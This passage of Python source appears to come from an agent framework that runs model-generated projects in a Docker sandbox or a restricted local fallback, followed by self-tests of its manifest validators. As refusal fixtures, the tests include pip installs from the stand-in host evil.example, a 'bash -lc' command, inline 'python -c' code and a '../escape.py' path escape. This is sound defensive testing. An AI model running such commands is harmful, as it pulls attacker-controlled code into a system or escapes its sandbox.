    docker_availability = docker_backend.availability()
    using_docker = docker_availability.available
    if using_docker:
        def operation_service(network_access: bool):
            spec = WorkspaceSpec(
                workspace_id=docker_spec.workspace_id,
                root=str(root), backend_kind="docker", execution_enabled=True,
                allowed_commands=ALLOWED_PYTHON_EXECUTABLES,
                max_file_bytes=file_byte_limit,
                network_access=network_access)
            backend_value = DockerWorkspace(spec, declaration)
            return backend_value, WorkspaceOperationService(
                backend_value, approvals=approvals, runtime=runtime)
        sandbox_record = {
            "backend_kind": "docker",
            "image": request.image,
            "network_policy": "dependency_setup_only",
        }
        fallback_note = None
    else:
        if not request.authority.allow_local_execution:
            raise GeneratedProjectError(
                "sandbox unavailable: docker_unavailable: the Docker command "
                f"is absent ({docker_availability.reason_code}) and host "
                "execution was not authorized; pass --allow-local-execution "
                "to run generated code as a host process without an "
                "operating-system sandbox")
        from .workspace_local import RestrictedLocalWorkspace

        def operation_service(network_access: bool):
            spec = WorkspaceSpec(
                workspace_id=docker_spec.workspace_id,
                root=str(root), backend_kind="restricted_local",
                execution_enabled=True,
                allowed_commands=ALLOWED_PYTHON_EXECUTABLES,
                max_file_bytes=file_byte_limit,
                network_access=False)
            backend_value = RestrictedLocalWorkspace(spec)
            return backend_value, WorkspaceOperationService(
                backend_value, approvals=approvals, runtime=runtime)
        sandbox_record = {
            "backend_kind": "restricted_local",
            "image": "",
            "network_policy": "host_process_network_unenforced",
            "fallback_reason_code": docker_availability.reason_code,
        }
        fallback_note = (
            "Docker was unavailable and host execution was explicitly "
            "authorized, so generated code ran as a host process with only "
            "the workspace file boundary and command allowlist. A host "
            "process is not an operating-system sandbox: it can reach the "
            "network, the filesystem, and the parent environment. Dependency "
            "network commands were refused and verification evidence carries "
            "this limitation.")

    backend, operations = operation_service(False)
    availability = backend.availability()
    if not availability.available:
        raise GeneratedProjectError(
            f"sandbox unavailable: {availability.reason_code}: "
            f"{availability.detail}")

    writes = []
    for input_artifact in request.input_artifacts:
        input_request = FileRequest(
            FileOperation.WRITE, input_artifact.path,
            content=input_artifact.content,
            replace_existing=False, create_parents=True)
        plan = operations.plan_file_write(
            input_request, loop_id=parent.loop_id,
            reason=f"Copy researched input artifact {input_artifact.path}.")
        approval_id = _approve_exact(operations, plan, request.authority)
        result = operations.file(input_request, approval_id=approval_id)
        writes.append({"input_artifact": True, **result.to_dict()})
        if not result.ok or result.digest != input_artifact.digest:
            raise GeneratedProjectError(
                f"project input copy failed for {input_artifact.path}")
    for file in request.manifest.files:
        file_request = FileRequest(
            FileOperation.WRITE, file.path,
            content=file.content.encode("utf-8"),
            replace_existing=False, create_parents=True)
        plan = operations.plan_file_write(
            file_request, loop_id=parent.loop_id,
            reason=f"Create generated project file {file.path}.")
        approval_id = _approve_exact(operations, plan, request.authority)
        result = operations.file(file_request, approval_id=approval_id)
        writes.append(result.to_dict())
        if not result.ok:
            raise GeneratedProjectError(
                f"generated file write failed for {file.path}: "
                f"{result.error_code}")

    commands = []
    for command in request.manifest.commands:
        if command.network_access and not request.authority.allow_network_reads:
            raise PermissionError(
                "task-build authority does not permit dependency network reads")
        if command.network_access and not using_docker:
            commands.append({
                "purpose": command.purpose,
                "command_kind": command.command_kind,
                "network_access": True,
                "expected_exit_codes": list(command.expected_exit_codes),
                "expectation_met": False,
                "ok": False,
                "argv": list(command.argv),
                "exit_code": -1,
                "stdout": "",
                "stderr": "",
                "error_code": "network_requires_docker_sandbox",
                "error": (
                    "the restricted local fallback has no operating-system "
                    "sandbox, so dependency network commands are refused"),
                "output_truncated": False,
            })
            break
        if not using_docker and command.argv[0] == "python":
            import shutil as _shutil
            if _shutil.which("python") is None:
                command = replace(
                    command,
                    argv=("python3", *command.argv[1:]))
        _command_backend, command_operations = operation_service(
            command.network_access)
        command_request = CommandRequest(
            command.argv, cwd=".", timeout_seconds=command.timeout_seconds,
            max_output_bytes=2 * 1024 * 1024,
            execution_authorized=True)
        plan = command_operations.plan_command(
            command_request, loop_id=parent.loop_id,
            reason=command.purpose)
        approval_id = _approve_exact(
            command_operations, plan, request.authority)
        result = command_operations.command(
            command_request, approval_id=approval_id)
        commands.append({
            "purpose": command.purpose,
            "command_kind": command.command_kind,
            "network_access": command.network_access,
            "expected_exit_codes": list(command.expected_exit_codes),
            "expectation_met": result.exit_code in command.expected_exit_codes,
            **result.to_dict()})
        if result.exit_code not in command.expected_exit_codes:
            break

    artifacts = []
    for expected in request.manifest.expected_artifacts:
        result = operations.file(FileRequest(FileOperation.STAT, expected.path))
        content_result = operations.file(FileRequest(
            FileOperation.READ, expected.path)) if result.ok else result
        format_valid, method, format_error = verify_artifact_content(
            expected.media_type,
            content_result.content if content_result.ok else b"")
        artifacts.append({
            **expected.to_dict(),
            "present": result.ok,
            "byte_count": result.byte_count,
            "digest": result.digest,
            "error_code": result.error_code,
            "format_valid": format_valid,
            "verification_method": method,
            "format_error": format_error,
            "verified": (result.ok
                         and result.byte_count >= expected.minimum_bytes
                         and format_valid),
        })
    if not request.manifest.expected_artifacts:
        artifacts = _authored_source_artifacts(request.manifest, operations, commands)
    snapshot = operations.snapshot(SnapshotRequest(include_hidden=False))
    deterministic_pass = bool(
        commands and all(item["expectation_met"] for item in commands)
        and all(item["verified"] for item in artifacts))
    record = {
        "record_type": "generated_project_execution/v1",
        "manifest_digest": request.manifest.digest,
        "workspace": backend.reference().to_dict(),
        "sandbox": sandbox_record,
        "writes": writes,
        "commands": commands,
        "artifacts": artifacts,
        "snapshot": snapshot.to_dict(),
        "deterministic_checks_passed": deterministic_pass,
    }
    if fallback_note is not None:
        record["limitations"] = (fallback_note,)
    return record


def self_test() -> dict:
    """Validate manifests without starting Docker or touching the network."""
    candidate = GeneratedProjectCandidate.from_mapping({
        "record_type": GENERATED_PROJECT_CANDIDATE_TYPE,
        "project_id": "general_test",
        "summary": "Create and verify one bounded project.",
        "files": [{
            "path": "main.py", "purpose": "Implement the requested work.",
            "acceptance": ["The file runs in the declared sandbox."]}],
        "commands": [{
            "argv": ["python", "main.py"],
            "purpose": "Run the generated project.",
            "timeout_seconds": 30,
        }],
        # main.py is authored; output.txt is what running it produces. The
        # two sets are disjoint because an artifact the model typed is not
        # evidence that a command ran.
        "expected_artifacts": [{
            "path": "output.txt", "media_type": "text/plain",
            "minimum_bytes": 1,
        }],
    })
    valid = GeneratedProjectManifest.from_mapping({
        "record_type": GENERATED_PROJECT_RECORD_TYPE,
        "project_id": "general_test",
        "summary": "Create and verify one bounded project.",
        "files": [{"path": "main.py", "content": "print('ok')\n"}],
        "commands": [{
            "argv": ["python", "main.py"],
            "purpose": "Run the generated project.",
            "timeout_seconds": 30,
        }],
        "expected_artifacts": [{
            "path": "output.txt", "media_type": "text/plain",
            "minimum_bytes": 1,
        }],
    })
    try:
        GeneratedProjectManifest.from_mapping({
            **valid.to_dict(), "expected_artifacts": [{
                "path": "main.py", "media_type": "text/x-python",
                "minimum_bytes": 1}]})
        typed_output_refused = ""
    except GeneratedProjectError as exc:
        typed_output_refused = str(exc)[:80]
    tests = [{
        "test": "generic_project_candidate_round_trips",
        "passed": GeneratedProjectCandidate.from_mapping(
            candidate.to_dict()).to_dict() == candidate.to_dict(),
        "detail": candidate.project_id,
    }, {
        "test": "generic_project_manifest_round_trips",
        "passed": GeneratedProjectManifest.from_mapping(
            valid.to_dict()).digest == valid.digest,
        "detail": valid.digest,
    }, {
        "test": "the_workspace_admits_the_inputs_the_runtime_supplied",
        # The real playground-series-s6e9 sizes. Against a flat 16 MB cap a
        # live run placed only the 7.7 MB submission template and refused the
        # 44.7 MB training rows, so no result was reachable.
        "passed": (workspace_file_byte_limit(()) == GENERATED_FILE_BYTE_FLOOR
                   and workspace_file_byte_limit(tuple(
                       GeneratedProjectInputArtifact(
                           f"inputs/f{index}.csv", b"x" * size, "text/csv")
                       for index, size in enumerate(
                           (7_737_432, 18_298_347, 44_707_646))))
                   == 44_707_646),
        "detail": f"floor {GENERATED_FILE_BYTE_FLOOR}, grows to the largest "
                  "supplied input",
    }, {
        "test": "an_expected_artifact_may_not_be_a_file_the_model_typed",
        "passed": bool(typed_output_refused),
        "detail": typed_output_refused or "a typed output was accepted",
    }]
    for label, media_type, body, expected in (
            ("pdf", "application/pdf", b"%PDF-1.4\n%%EOF", True),
            ("bad_pdf", "application/pdf", b"not a PDF", False),
            ("html", "text/html", b"<html><body>ok</body></html>", True),
            ("bad_html", "text/html", b"plain text", False)):
        observed, _method, _error = verify_artifact_content(media_type, body)
        tests.append({
            "test": f"generated_project_verifies_{label}_format",
            "passed": observed is expected,
            "detail": media_type,
        })
    supplied = (GeneratedProjectInputArtifact(
        "inputs/source-1.csv", b"a,b\n1,2\n", "text/csv"),)
    input_project = GeneratedProjectManifest.from_mapping({
        **valid.to_dict(), "files": [{
            "path": "main.py",
            "content": "from pathlib import Path\nPath('inputs/source-1.csv').read_text()\n"}]})
    input_validation = validate_generated_project_input_use(
        input_project, supplied)
    tests.append({
        "test": "generated_project_uses_exact_supplied_input_path",
        "passed": input_validation["referenced_paths"]
        == ["inputs/source-1.csv"]
        and input_validation["assessment"] == "static_binding_match"
        and input_validation["runtime_use_verified"] is False,
        "detail": "static path binding only, not proof of runtime consumption",
    })
    for label, project in (
            ("ignored_input", valid),
            ("input_path_only_in_documentation",
             GeneratedProjectManifest.from_mapping({
                 **valid.to_dict(), "files": [
                     {"path": "main.py", "content": "print('ok')\n"},
                     {"path": "README.md",
                      "content": "Use inputs/source-1.csv.\n"}]})),
            ("input_path_only_in_comment",
             GeneratedProjectManifest.from_mapping({
                 **valid.to_dict(), "files": [{
                     "path": "main.py",
                     "content": "# inputs/source-1.csv\nprint('ok')\n"}]})),
            ("offline_network_import", GeneratedProjectManifest.from_mapping({
                **valid.to_dict(), "files": [{
                    "path": "main.py",
                    "content": "import requests\nrequests.get('https://example.com')\n"}]}))):
        refused = False
        try:
            validate_generated_project_input_use(project, supplied)
        except GeneratedProjectError:
            refused = True
        tests.append({
            "test": f"generated_project_refuses_{label}",
            "passed": refused,
            "detail": "refused before workspace or command effects",
        })
    def screen(source, additional_files=(), artifacts=supplied):
        project = GeneratedProjectManifest.from_mapping({
            **valid.to_dict(), "files": [
                {"path": "main.py", "content": source}, *additional_files]})
        return validate_generated_project_input_use(project, artifacts)

    composed = screen(
        "from pathlib import Path\nimport shutil\n"
        "PROJECT_ROOT = Path(__file__).resolve().parents[1]\n"
        "INPUT_ROOT = PROJECT_ROOT / 'inputs' / 'attempt-1'\n"
        "EVIDENCE_ROOT = PROJECT_ROOT / 'evidence' / 'original'\n"
        "shutil.copytree(INPUT_ROOT, EVIDENCE_ROOT)\n"
        "for relative in ('module.py', 'requirements.txt'):\n"
        "    (EVIDENCE_ROOT / relative).read_text()\n",
        ({"path": "requirements.txt", "content": "numpy\n"},),
        (GeneratedProjectInputArtifact("inputs/attempt-1/module.py", b"original"),
         GeneratedProjectInputArtifact("inputs/attempt-1/requirements.txt", b"numpy")))
    tests.append({
        "test": "composed_input_copytree_and_relative_reads_are_unresolved_not_rejected",
        "passed": composed["passed"] and composed["assessment"] == "unresolved"
        and not composed["runtime_use_verified"]
        and composed["task_acceptance"] == "not_evaluated",
        "detail": "reconstructed workspace preparation pattern; no symbolic execution",
    })
    for label, source in (
            ("simple_wrong_direct_binding", "from pathlib import Path\nPath('source-1.csv').read_text()\n"),
            ("unused_path_literal", "value = 'inputs/source-1.csv'\nprint('ok')\n"),
            ("path_only_in_docstring", "'''inputs/source-1.csv'''\nprint('ok')\n")):
        try:
            screen(source)
            refused = False
        except GeneratedProjectError:
            refused = True
        tests.append({"test": "generated_project_refuses_" + label,
                      "passed": refused, "detail": "simple static refusal, not inferred runtime behavior"})
    for label, source in (
            ("composed_path", "from pathlib import Path\n(Path('inputs') / 'source-1.csv').read_text()\n"),
            ("cwd_change", "import os\nos.chdir('inputs')\nopen('source-1.csv').read()\n"),
            ("imported_helper", "from helper import consume\nconsume('source-1.csv')\n"),
            ("unrecognized_call", "consume_inputs(configuration)\n"),
            ("dynamic_open_mode", "open('source-1.csv', mode=selected_mode)\n")):
        assessment = screen(source)
        tests.append({"test": "generated_project_keeps_" + label + "_unresolved",
                      "passed": assessment["assessment"] == "unresolved"
                      and not assessment["runtime_use_verified"],
                      "detail": "unknown behavior requires execution and independent evaluation"})
    collision = screen("from pathlib import Path\nPath('requirements.txt').read_text()\n",
        ({"path": "requirements.txt", "content": "numpy\n"},),
        (GeneratedProjectInputArtifact("inputs/original/requirements.txt", b"numpy"),))
    tests.append({"test": "generated_owned_file_is_not_a_wrong_supplied_basename",
                  "passed": collision["assessment"] == "unresolved"
                  and not collision["unresolved_path_candidates"],
                  "detail": "generated requirements have their own path identity"})
    write_modes = [screen(f"open('source-1.csv', {mode!r})\n")
                   for mode in ("w", "a", "x", "w+", "r+")]
    tests.append({"test": "write_or_update_open_modes_are_not_source_read_evidence",
                  "passed": all(item["assessment"] == "unresolved"
                                and not item["referenced_paths"]
                                and not item["unresolved_path_candidates"] for item in write_modes),
                  "detail": "no source mismatch inferred from an output/update operand"})
    from types import SimpleNamespace
    try:
        _approve_exact(None, SimpleNamespace(request=FileRequest(
            FileOperation.WRITE, "output.txt", content=b"test")),
            GeneratedProjectAuthority("test", False, False, False))
        authority_refused = False
    except PermissionError:
        authority_refused = True
    tests.append({"test": "static_screen_does_not_grant_effects_or_task_acceptance",
                  "passed": authority_refused and composed["passed"]
                  and composed["task_acceptance"] == "not_evaluated"
                  and not composed.get("deterministic_checks_passed", False),
                  "detail": "consumer stores the screen; effects and task verification remain separate"})
    unsafe = (
        ("path_escape", {**valid.to_dict(), "files": [
            {"path": "../escape.py", "content": ""}]}),
        ("shell_command", {**valid.to_dict(), "commands": [{
            "argv": ["bash", "-lc", "anything"], "purpose": "bad",
            "timeout_seconds": 10}]}),
        ("inline_code", {**valid.to_dict(), "commands": [{
            "argv": ["python", "-c", "anything"], "purpose": "bad",
            "timeout_seconds": 10}]}),
        ("model_invented_artifact_threshold", {
            **valid.to_dict(), "expected_artifacts": [{
                "path": "main.py", "media_type": "text/x-python",
                "minimum_bytes": 1000}]}),
    )
    for name, value in unsafe:
        refused = False
        try:
            GeneratedProjectManifest.from_mapping(value)
        except GeneratedProjectError:
            refused = True
        tests.append({
            "test": f"generated_project_refuses_{name}",
            "passed": refused,
            "detail": "refused before any effect",
        })

    # Backend fallback: Docker unavailable means the restricted local backend
    # executes the same manifest with the same allowlist and approvals, and
    # dependency network commands become typed refusals instead of run
    # termination.
    import tempfile
    import unittest.mock
    from ..loop.recursive_loop import Loop, LoopConfig
    from ..loop.loop_role import LoopRole, LoopRoleIdentity, LoopRelationship

    run_manifest = GeneratedProjectManifest.from_mapping({
        "record_type": GENERATED_PROJECT_RECORD_TYPE,
        "project_id": "fallback_test",
        "summary": "Run one bounded local project.",
        "files": [{
            "path": "main.py",
            "content": "from pathlib import Path\n"
                       "Path('output.txt').write_text('local ok\\n')\n"}],
        "commands": [{
            "argv": ["python", "main.py"],
            "purpose": "Run the generated project.",
            "timeout_seconds": 30,
        }],
        "expected_artifacts": [{
            "path": "output.txt", "media_type": "text/plain",
            "minimum_bytes": 1,
        }],
    })
    config = LoopConfig(
        framework="custom", custom_steps=("execute",), power="light",
        allowable_modes=("deterministic",),
        preferred_modes=("deterministic",),
        delegated_modes=("deterministic",),
        logical_kind="execution", replay_guarantee="event_equivalent",
        exit_condition="steps_complete")
    parent = Loop(
        "generated project fallback self-test", config,
        identity=LoopRoleIdentity(LoopRole.PRACTITIONER, "practitioner.solver"),
        relationship=LoopRelationship.starting())
    context = GeneratedProjectExecutionContext(parent_loop=parent)
    authority = GeneratedProjectAuthority(
        "self-test", allow_workspace_writes=True,
        allow_sandbox_commands=True, allow_network_reads=True,
        allow_local_execution=True)

    def _docker_unavailable(spec=None, declaration=None):
        from .workspace_contracts import BackendAvailability
        return BackendAvailability(
            False, "docker", "dependency_unavailable",
            "Docker command was not found; no process was started")

    with tempfile.TemporaryDirectory() as workspace_root:
        with unittest.mock.patch.object(
                DockerWorkspace, "availability", _docker_unavailable):
            executed = execute_generated_project(
                GeneratedProjectExecutionRequest(
                    run_manifest, workspace_root, authority),
                context)
        local_run_ok = (
            executed["sandbox"]["backend_kind"] == "restricted_local"
            and executed["sandbox"]["fallback_reason_code"]
            == "dependency_unavailable"
            and executed["deterministic_checks_passed"] is True
            and any(item["ok"] for item in executed["commands"])
            and executed["limitations"]
            and "operating-system sandbox" in executed["limitations"][0])
        tests.append({
            "test": "local_fallback_runs_when_docker_is_unavailable",
            "passed": local_run_ok,
            "detail": "same manifest, allowlist, and approvals run on the "
                      "restricted local backend with a declared limitation",
        })

    network_manifest = GeneratedProjectManifest.from_mapping({
        **run_manifest.to_dict(),
        "commands": [{
            "argv": ["python", "-m", "pip", "install", "numpy"],
            "purpose": "Install dependencies.",
            "timeout_seconds": 30,
            "network_access": True,
            "command_kind": "setup",
        }],
    })
    with tempfile.TemporaryDirectory() as workspace_root:
        with unittest.mock.patch.object(
                DockerWorkspace, "availability", _docker_unavailable):
            network_executed = execute_generated_project(
                GeneratedProjectExecutionRequest(
                    network_manifest, workspace_root, authority),
                context)
        network_refused = (
            not network_executed["deterministic_checks_passed"]
            and any(item["error_code"] == "network_requires_docker_sandbox"
                    for item in network_executed["commands"]))
        tests.append({
            "test": "local_fallback_refuses_network_commands",
            "passed": network_refused,
            "detail": "a dependency network command becomes a typed refusal "
                      "instead of an uncaught run failure",
        })

    def _refused(**kwargs) -> bool:
        try:
            GeneratedProjectCommand(**kwargs)
        except GeneratedProjectError:
            return True
        return False

    tests.append({
        "test": "non_finite_or_absurd_timeouts_are_refused",
        "passed": (
            _refused(argv=("python", "main.py"), purpose="run",
                     timeout_seconds=float("inf"))
            and _refused(argv=("python", "main.py"), purpose="run",
                         timeout_seconds=float("nan"))
            and _refused(argv=("python", "main.py"), purpose="run",
                         timeout_seconds=MAXIMUM_COMMAND_TIMEOUT_SECONDS + 1)
            and not _refused(argv=("python", "main.py"), purpose="run",
                             timeout_seconds=300.0)),
        "detail": "timeouts must be finite and enforceable"})
    tests.append({
        "test": "pip_setup_refuses_index_link_path_and_url_arguments",
        "passed": (
            _refused(argv=("python", "-m", "pip", "install", "--index-url",
                           "http://evil.example/simple", "requests"),
                     purpose="setup", command_kind="setup",
                     network_access=True)
            and _refused(argv=("python", "-m", "pip", "install",
                               "https://evil.example/pkg.tar.gz"),
                         purpose="setup", command_kind="setup",
                         network_access=True)
            and _refused(argv=("python", "-m", "pip", "install", "/tmp/pkg"),
                         purpose="setup", command_kind="setup",
                         network_access=True)
            and not _refused(argv=("python", "-m", "pip", "install",
                                   "--no-cache-dir", "pandas==2.2.0"),
                             purpose="setup", command_kind="setup",
                             network_access=True)),
        "detail": "only requirement specifiers and reviewed pip options"})
    tests.append({
        "test": "host_execution_requires_explicit_authority",
        "passed": GeneratedProjectAuthority(
            "actor", True, True, False).allow_local_execution is False,
        "detail": "allow_local_execution defaults to False"})
    tests.extend(_code_only_project_checks())
    tests.extend(_input_path_collision_checks())
    passed = sum(item["passed"] for item in tests)
    return {
        "record_type": "generated_project_test/v1",
        "tests": tests,
        "passed": passed,
        "total": len(tests),
        "all_passed": passed == len(tests),
    }


def _input_path_collision_checks() -> list[dict]:
    """Inputs cannot collide with authored files before any workspace effect."""
    import tempfile
    from types import SimpleNamespace
    from unittest.mock import patch

    tests = []
    supplied = (GeneratedProjectInputArtifact("inputs/data.txt", b"original fixture"),)

    def manifest(path):
        return GeneratedProjectManifest.from_mapping({
            "record_type": GENERATED_PROJECT_RECORD_TYPE, "project_id": "collision_fixture",
            "summary": "Validate source and authored path separation.",
            "files": [{"path": path, "content": "pass\n"}],
            "commands": [{"argv": ["python", "-m", "unittest"], "purpose": "Verify.",
                          "command_kind": "verify"}], "expected_artifacts": []})

    authority = GeneratedProjectAuthority("fixture", True, True, False)
    with tempfile.TemporaryDirectory(prefix="loop-engine-collision-") as directory:
        root = Path(directory) / "must-not-exist"
        for label, path in (("same_path", "inputs/data.txt"),
                            ("authored_parent", "inputs"),
                            ("authored_nested", "inputs/data.txt/main.py"),
                            ("normalized_backslash", "inputs\\data.txt")):
            try:
                GeneratedProjectExecutionRequest(manifest(path), str(root), authority,
                                                 input_artifacts=supplied)
                refused = False
            except GeneratedProjectError as exc:
                refused = "distinct authored and output paths" in str(exc)
            tests.append({"test": "authored_input_collision_refuses_" + label,
                          "passed": refused and not root.exists(),
                          "detail": "execution request rejected before root creation"})
        good = GeneratedProjectExecutionRequest(manifest("inputs/data.txt.py"), str(root),
                                                authority, input_artifacts=supplied)
        tests.append({"test": "similar_prefix_is_not_a_path_collision",
                      "passed": good.manifest.files[0].path == "inputs/data.txt.py"
                      and not root.exists(), "detail": "path components, not string prefixes"})
        # A forged frozen object must still meet the same effect preflight.
        object.__setattr__(good, "manifest", manifest("inputs/data.txt"))
        context = GeneratedProjectExecutionContext(SimpleNamespace(loop_id="fixture", ledger=object()))
        with patch.object(Path, "mkdir") as mkdir, patch.object(DockerWorkspace, "availability") as availability:
            try:
                execute_generated_project(good, context)
                refused = False
            except GeneratedProjectError:
                refused = True
        tests.append({"test": "executor_collision_preflight_has_zero_workspace_or_backend_effects",
                      "passed": refused and not mkdir.called and not availability.called
                      and supplied[0].content == b"original fixture",
                      "detail": "defensive effect-boundary validation; original input unchanged"})
    return tests


def _code_only_project_checks() -> list[dict]:
    """Generic authored-code delivery and strict admission, without models."""
    import tempfile
    from unittest.mock import patch

    from ..code_nodes.solve_runtime import _product_result
    from ..loop.loop_role import LoopRole, LoopRoleIdentity
    from ..loop.recursive_loop import Loop, LoopConfig
    from .workspace_contracts import BackendAvailability

    tests = []

    def check(name, passed):
        tests.append({"test": name, "passed": bool(passed), "detail": ""})

    candidate_body = {
        "record_type": GENERATED_PROJECT_CANDIDATE_TYPE,
        "project_id": "code_only", "summary": "Library with runnable tests.",
        "files": [{"path": "library.py", "purpose": "Reusable library"},
                  {"path": "test_library.py", "purpose": "Verify library"}],
        "commands": [{"argv": ["python", "-m", "unittest", "-q"],
                      "purpose": "Run unit tests", "command_kind": "verify"}],
        "expected_artifacts": [],
    }
    candidate = GeneratedProjectCandidate.from_mapping(candidate_body)
    manifest_body = {
        **candidate.to_dict(), "record_type": GENERATED_PROJECT_RECORD_TYPE,
        "files": [{"path": "library.py", "content": "def combine(a, b):\n    return a + b\n"},
                  {"path": "test_library.py", "content":
                   "import unittest\nfrom library import combine\n"
                   "class LibraryTests(unittest.TestCase):\n"
                   "    def test_combine(self):\n        self.assertEqual(combine(2, 3), 5)\n"}],
    }
    manifest = GeneratedProjectManifest.from_mapping(manifest_body)
    check("code_only_candidate_and_manifest_need_no_fabricated_data_outputs",
          not candidate.expected_artifacts and not manifest.expected_artifacts
          and candidate.commands[0].command_kind == "verify")

    def invalid(change):
        body = json.loads(json.dumps(candidate_body))
        change(body)
        try:
            GeneratedProjectCandidate.from_mapping(body)
        except GeneratedProjectError as exc:
            return str(exc)
        return ""

    check("code_only_without_a_zero_exit_verify_command_is_refused",
          "code_only_requires_zero_exit_verify_command" in invalid(
              lambda body: body["commands"][0].update(command_kind="execute"))
          and "code_only_requires_zero_exit_verify_command" in invalid(
              lambda body: body["commands"][0].update(expected_exit_codes=[1])))
    check("candidate_empty_required_arrays_name_the_field",
          invalid(lambda body: body.update(files=[])) == "candidate.files: empty_array"
          and invalid(lambda body: body.update(commands=[])) == "candidate.commands: empty_array")
    check("candidate_missing_fields_are_named_without_echoing_values",
          invalid(lambda body: body.pop("summary")) == "candidate: missing_fields=summary")
    discarded = invalid(lambda body: body["files"].append("PRIVATE_ITEM_VALUE"))
    check("candidate_does_not_silently_discard_nonobject_array_members",
          discarded == "candidate.files[2]: expected_object"
          and "PRIVATE_ITEM_VALUE" not in discarded
          and invalid(lambda body: body["commands"].append(None))
          == "candidate.commands[1]: expected_object"
          and invalid(lambda body: body["expected_artifacts"].append(True))
          == "candidate.expected_artifacts[0]: expected_object")
    check("candidate_nested_missing_fields_name_the_item",
          invalid(lambda body: body["files"][0].pop("purpose"))
          == "candidate.files[0]: missing_fields=purpose")
    check("candidate_does_not_coerce_boolean_numeric_null_or_string_collections",
          invalid(lambda body: body["commands"][0].update(network_access="false"))
          == "candidate.commands[0].network_access: expected_boolean"
          and invalid(lambda body: body["commands"][0].update(timeout_seconds="300"))
          == "candidate.commands[0].timeout_seconds: expected_finite_number"
          and invalid(lambda body: body.update(summary=None)) == "candidate.summary: expected_text"
          and invalid(lambda body: body["files"][0].update(acceptance="text"))
          == "candidate.files[0].acceptance: expected_array"
          and invalid(lambda body: body["commands"][0].update(expected_exit_codes=[True]))
          == "candidate.commands[0].expected_exit_codes[0]: expected_integer")
    check("unexpected_field_diagnostic_does_not_expose_untrusted_key",
          invalid(lambda body: body.update({"PRIVATE_FIELD_NAME": "PRIVATE_VALUE"}))
          == "candidate: unexpected_fields_count=1")
    check("authored_and_command_produced_artifacts_still_cannot_overlap",
          bool(invalid(lambda body: body.update(expected_artifacts=[{
              "path": "library.py", "media_type": "text/x-python"}]))))
    bad_manifest = {**manifest_body, "files": [{"path": "library.py", "content": None}]}
    try:
        GeneratedProjectManifest.from_mapping(bad_manifest)
        manifest_refused = ""
    except GeneratedProjectError as exc:
        manifest_refused = str(exc)
    check("manifest_reader_also_refuses_null_file_content_without_coercion",
          manifest_refused == "manifest.files[0].content: expected_text")

    owner = Loop("code-only delivery checks", LoopConfig(
        framework="custom", custom_steps=("execute",), power="light",
        allowable_modes=("deterministic",), preferred_modes=("deterministic",)),
        identity=LoopRoleIdentity(LoopRole.PRACTITIONER, "practitioner.solver"))
    authority = GeneratedProjectAuthority("self-test", True, True, False, True)
    unavailable = BackendAvailability(False, "docker", "dependency_unavailable", "offline fixture")

    def execute(project, root):
        with patch.object(DockerWorkspace, "availability", return_value=unavailable):
            return execute_generated_project(GeneratedProjectExecutionRequest(
                project, root, authority), GeneratedProjectExecutionContext(owner))

    with tempfile.TemporaryDirectory(prefix="code-only-verified-") as root:
        result = execute(manifest, root)
        check("successful_code_only_verification_exposes_exact_authored_sources",
              result["deterministic_checks_passed"]
              and len(result["artifacts"]) == 2
              and all(item["verified"] and item["source_digest_matches"]
                      and item["artifact_origin"] == "authored_source"
                      and item["command_produced"] is False for item in result["artifacts"]))
        public = _product_result({"project_attempts": [{
            **result, "workspace_path": root, "manifest": manifest.to_dict()}]}, True)
        check("public_product_projection_includes_code_only_files",
              len(public["artifacts"]) == 2
              and {Path(item["path"]).name for item in public["artifacts"]}
              == {"library.py", "test_library.py"})
    broken = replace(manifest, files=(manifest.files[0], GeneratedProjectFile(
        manifest.files[1].path, manifest.files[1].content.replace(
            "combine(2, 3), 5", "combine(2, 3), 6"))))
    with tempfile.TemporaryDirectory(prefix="code-only-failed-") as root:
        result = execute(broken, root)
        check("failed_verify_cannot_verify_authored_source_artifacts",
              not result["deterministic_checks_passed"]
              and result["commands"][0]["exit_code"] != 0
              and all(not item["verified"] for item in result["artifacts"]))
    for label, content in (
            ("changed", "from pathlib import Path\nPath('library.py').write_text('changed = True\\n')\n"),
            ("missing", "from pathlib import Path\nPath('library.py').unlink()\n")):
        altered = replace(manifest,
            files=(*manifest.files, GeneratedProjectFile("alter.py", content)),
            commands=(*manifest.commands, GeneratedProjectCommand(
                ("python", "alter.py"), "Alter source after tests")))
        with tempfile.TemporaryDirectory(prefix="code-only-source-") as root:
            result = execute(altered, root)
            check("post_verification_" + label + "_source_invalidates_source_set",
                  not result["deterministic_checks_passed"]
                  and all(not item["verified"] for item in result["artifacts"]))
    syntax_bad = replace(manifest, files=(*manifest.files,
        GeneratedProjectFile("unused.py", "def incomplete(\n")))
    with tempfile.TemporaryDirectory(prefix="code-only-syntax-") as root:
        result = execute(syntax_bad, root)
        check("unimported_invalid_python_source_cannot_be_verified_by_passing_tests",
              result["commands"][0]["exit_code"] == 0
              and not result["deterministic_checks_passed"]
              and all(not item["verified"] for item in result["artifacts"]))
    return tests
